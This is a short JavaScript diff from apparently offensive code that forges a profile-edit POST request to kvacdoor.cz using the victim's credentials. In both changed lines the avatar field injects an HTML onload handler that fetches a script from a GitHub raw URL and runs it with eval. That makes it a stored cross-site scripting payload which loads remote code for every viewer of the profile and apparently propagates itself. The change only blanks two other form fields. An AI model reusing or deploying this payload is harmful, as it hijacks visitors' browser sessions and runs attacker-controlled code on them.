@@ -80,7 +80,7 @@ function main() {
         },
         "referrer": "https://kvacdoor.cz/profile/" + id,
         "referrerPolicy": "strict-origin-when-cross-origin",
-        "body": 'username=' + username + '&avatar=' + avatar + '" onload="fetch(`https://raw.githubusercontent.com/Clineeeche/Clineeeche.github.io/main/JQuery?${Date.now()}`).then( async result => eval(await result.text()))&description=test&steamid=test&edit-profile=',
+        "body": 'username=' + username + '&avatar=' + avatar + '" onload="fetch(`https://raw.githubusercontent.com/Clineeeche/Clineeeche.github.io/main/JQuery?${Date.now()}`).then( async result => eval(await result.text()))&description=&steamid=&edit-profile=',
         "method": "POST",
         "mode": "cors",
         "credentials": "include"
